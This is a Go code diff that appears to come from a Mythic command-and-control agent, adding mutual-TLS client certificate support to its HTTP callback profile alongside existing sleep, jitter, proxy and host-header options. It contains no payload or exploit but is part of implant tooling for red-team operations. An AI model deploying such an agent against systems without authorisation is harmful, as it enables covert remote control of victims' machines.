@@ -43,6 +43,8 @@ type sensitiveConfig struct {
 	PostEndpoint  string            `json:"p"`
 	CustomHeaders map[string]string `json:"x,omitempty"`
 	ContentTypes  []string          `json:"ct,omitempty"`
+	MTLSCertPEM   string            `json:"mc,omitempty"` // PEM client certificate for mTLS
+	MTLSKeyPEM    string            `json:"mk,omitempty"` // PEM client private key for mTLS
 }
 
 // HTTPProfile handles HTTP communication with Mythic
@@ -103,7 +105,7 @@ type HTTPProfile struct {
 // proxyUser and proxyPass are optional proxy authentication credentials.
 // If proxyURL is empty, the system proxy is used (HTTP_PROXY/HTTPS_PROXY env vars).
 // If proxyURL contains embedded credentials (http://user:pass@host:port), those take precedence.
-func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, proxyUser, proxyPass, tlsVerify, tlsFingerprint string, fallbackURLs, contentTypes []string, recoverySeconds int) *HTTPProfile {
+func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, proxyUser, proxyPass, tlsVerify, tlsFingerprint, mtlsCertPEM, mtlsKeyPEM string, fallbackURLs, contentTypes []string, recoverySeconds int) *HTTPProfile {
 	profile := &HTTPProfile{
 		BaseURL:       baseURL,
 		UserAgent:     userAgent,
@@ -122,6 +124,13 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 
 	// Configure TLS based on verification mode
 	tlsConfig := buildTLSConfig(tlsVerify)
+
+	// Configure mTLS client certificate if provided
+	if mtlsCertPEM != "" && mtlsKeyPEM != "" {
+		if cert, err := tls.X509KeyPair([]byte(mtlsCertPEM), []byte(mtlsKeyPEM)); err == nil {
+			tlsConfig.Certificates = []tls.Certificate{cert}
+		}
+	}
 
 	// Configure transport with optional proxy
 	transport := &http.Transport{
